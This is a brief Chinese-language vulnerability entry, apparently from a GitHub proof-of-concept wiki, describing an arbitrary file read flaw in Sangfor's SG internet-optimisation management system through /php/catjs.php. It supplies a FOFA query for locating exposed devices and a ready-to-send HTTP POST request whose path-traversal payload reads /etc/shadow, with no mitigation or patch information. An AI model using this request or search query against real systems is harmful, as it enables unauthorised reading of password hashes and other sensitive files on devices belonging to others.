## 深信服SG上网优化管理系统 catjs.php 任意文件读取漏洞

## fofa
```
title=="SANGFOR上网优化管理"
```


```
POST /php/catjs.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Content-Length: 32

["../../../../../../etc/shadow"]
```

![9d1238a7ccbf56f3d36759ead05f1bcf](https://github.com/wy876/wiki/assets/139549762/42238697-6a27-4dbc-b274-db8f83ce6a49)

